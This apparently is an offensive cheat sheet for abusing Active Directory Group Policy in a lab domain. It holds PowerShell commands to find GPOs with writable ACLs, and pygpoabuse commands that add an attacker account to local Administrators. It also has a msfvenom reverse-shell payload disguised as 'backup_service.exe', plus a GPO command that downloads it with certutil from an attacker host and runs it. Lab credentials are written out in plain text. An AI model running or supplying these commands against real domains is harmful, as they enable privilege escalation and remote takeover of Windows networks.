# Search Domain GPOs
```powershell
Get-DomainGPO | Get-DomainObjectAcl | Where-Object {
    $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" 
}
```

# Search OU with GPO Link
```powershell
Get-DomainGPO -Identity "GPO-NAME" | Select-Object -ExpandProperty gpolink
```

# GPO Manipulation 1 ( Add Local Administrator )
```powershell
python3 pygpoabuse.py 'warzone.oxsium.local/ShadowOperator:Oxsium_Lab123!' -gpo-name "GPO_ADINIZ" -command "net localgroup Administrators ShadowOperator /add" -dc-ip 192.168.1.10

python3 pygpoabuse.py 'warzone.oxsium.local/ShadowOperator:Oxsium_Lab123!' -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -command "net localgroup Administrators ShadowOperator /add" -dc-ip 192.168.1.10
```

# GPO Manipulation 2 ( Reverse Shell )
```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.241 LPORT=12000 -f exe -o backup_service.exe

python3 pygpoabuse.py 'warzone.oxsium.local/ShadowOperator:Oxsium_Lab123!' -gpo-name "GPO_ADINIZ" -powershell -command "cmd /c certutil -urlcache -f http://192.168.0.241/backup_service.exe C:\Windows\Temp\svc.exe && C:\Windows\Temp\svc.exe"
```

